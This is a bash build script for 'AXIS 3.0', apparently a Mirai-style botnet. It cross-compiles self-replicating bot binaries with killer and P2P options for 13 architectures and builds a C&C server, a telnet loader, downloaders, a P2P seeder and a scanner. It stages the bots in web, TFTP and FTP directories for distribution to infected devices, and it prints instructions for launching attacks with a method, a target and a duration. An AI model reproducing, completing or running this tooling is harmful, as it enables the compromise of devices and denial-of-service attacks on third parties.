#!/bin/bash
# ============================================================================
# AXIS 3.0 Build Script
# ============================================================================
# Builds all components: bots (13 archs), C&C, loader, DLRs, seeder
#
# Prerequisites:
#   Option A: Run setup_cross_compilers.sh first (installs compilers system-wide)
#   Option B: Use Docker (fully self-contained):
#       docker build -t axis3-builder .
#       docker run -v $(pwd):/workspace axis3-builder ./build.sh
# ============================================================================

echo "AXIS 3.0 Build"
echo "=============="
echo ""

# Go environment
export GOROOT=/usr/local/go
export GOPATH=${HOME}/go
export PATH=$GOROOT/bin:$PATH

# Cross-compiler mappings
declare -A ARCH_CC=(
    ["arm"]="arm-linux-gnueabi-gcc"
    ["arm5"]="arm-linux-gnueabi-gcc"
    ["arm6"]="arm-linux-gnueabihf-gcc"
    ["arm7"]="arm-linux-gnueabihf-gcc"
    ["mips"]="mips-linux-gnu-gcc"
    ["mpsl"]="mipsel-linux-gnu-gcc"
    ["x86"]="i686-linux-gnu-gcc"
    ["x86_64"]="x86_64-linux-gnu-gcc"
    ["ppc"]="powerpc-linux-gnu-gcc"
    ["spc"]="sparc-linux-gnu-gcc"
    ["m68k"]="m68k-linux-gnu-gcc"
    ["sh4"]="sh4-linux-gnu-gcc"
    ["arc"]="arc-linux-gnu-gcc"
)

# Create output directories
mkdir -p bins /var/www/html/bins /var/lib/tftpboot /var/ftp logs

# ============================================================================
# Build C&C Server
# ============================================================================
echo "[*] Building C&C..."
if command -v go &> /dev/null; then
    cd cnc
    go mod init production-cnc 2>/dev/null
    go get github.com/go-sql-driver/mysql 2>/dev/null
    go get github.com/mattn/go-shellwords 2>/dev/null
    go build -o ../cnc_server . 2>/dev/null && echo "[+] C&C built" || echo "[-] C&C failed"
    cd ..
else
    echo "[-] Go not installed. Skipping C&C build."
    echo "    Install Go from https://go.dev/dl/ or use Docker build."
fi

# ============================================================================
# Build Bots (13 architectures)
# ============================================================================
echo ""
echo "[*] Building bots..."

BOT_FLAGS="-DKILLER -DSELFREP -DP2P_ENABLED=1"

for arch in "${!ARCH_CC[@]}"; do
    CC="${ARCH_CC[$arch]}"
    echo -n "  $arch: "

    if command -v $CC &> /dev/null; then
        if $CC -std=gnu99 $BOT_FLAGS -Os -o "bins/axis.$arch" bot/*.c 2>/dev/null; then
            strip "bins/axis.$arch" 2>/dev/null
            cp "bins/axis.$arch" /var/www/html/bins/ 2>/dev/null
            cp "bins/axis.$arch" /var/lib/tftpboot/ 2>/dev/null
            cp "bins/axis.$arch" /var/ftp/ 2>/dev/null
            echo "OK"
        else
            echo "FAIL"
        fi
    else
        echo "SKIP (no compiler)"
    fi
done

# ============================================================================
# Build Loader
# ============================================================================
echo ""
echo "[*] Building loader..."
cd loader
gcc -std=gnu99 -O3 -o ../loader *.c -lpthread 2>/dev/null && echo "[+] Loader built" || echo "[-] Loader failed"
cd ..

# ============================================================================
# Build DLRs (Downloaders)
# ============================================================================
echo ""
echo "[*] Building DLRs..."
cd dlr
for arch in "${!ARCH_CC[@]}"; do
    CC="${ARCH_CC[$arch]}"
    echo -n "  $arch: "
    if command -v $CC &> /dev/null; then
        if $CC -std=gnu99 -Os -static -nostdlib -o "../bins/dlr.$arch" main.c 2>/dev/null; then
            strip "../bins/dlr.$arch" 2>/dev/null
            cp "../bins/dlr.$arch" /var/www/html/bins/ 2>/dev/null
            echo "OK"
        else
            echo "FAIL"
        fi
    fi
done
cd ..

# ============================================================================
# Build P2P Seeder
# ============================================================================
echo ""
echo "[*] Building P2P Seeder..."
if command -v go &> /dev/null; then
    cd seeder
    go mod init seeder 2>/dev/null
    go build -o ../seeder_server . 2>/dev/null && echo "[+] Seeder built" || echo "[-] Seeder failed"
    cd ..
else
    echo "[-] Go not installed. Skipping seeder build."
fi

# ============================================================================
# Set permissions
# ============================================================================
chmod +x cnc_server loader 2>/dev/null
chmod 777 bins/* 2>/dev/null

echo ""
echo "=========================================="
echo "Build Complete!"
echo "=========================================="
echo ""
echo "Binaries: ./bins/"
echo ""
echo "To run:"
echo "  ./cnc_server                          # C&C server"
echo "  ./loader                              # Telnet loader"
echo "  ./seeder_server <method> <target> <time>  # P2P seeder"
echo ""
echo "Cross-compiler setup (if needed):"
echo "  ./setup_cross_compilers.sh            # Install compilers"
echo "  # OR use Docker:"
echo "  docker build -t axis3-builder ."
echo "  docker run -v \$(pwd):/workspace axis3-builder ./build.sh"
echo ""

# ============================================================================
# Build Scanner
# ============================================================================
if command -v go &> /dev/null; then
    echo ""
    echo "[*] Building Scanner..."
    cd scanner
    go mod init scanner 2>/dev/null
    go build -o ../scanner . 2>/dev/null && echo "[+] Scanner built" || echo "[-] Scanner failed"
    cd ..
else
    echo "[-] Go not installed. Skipping scanner build."
fi

# Update permissions
chmod +x cnc_server loader scanner 2>/dev/null
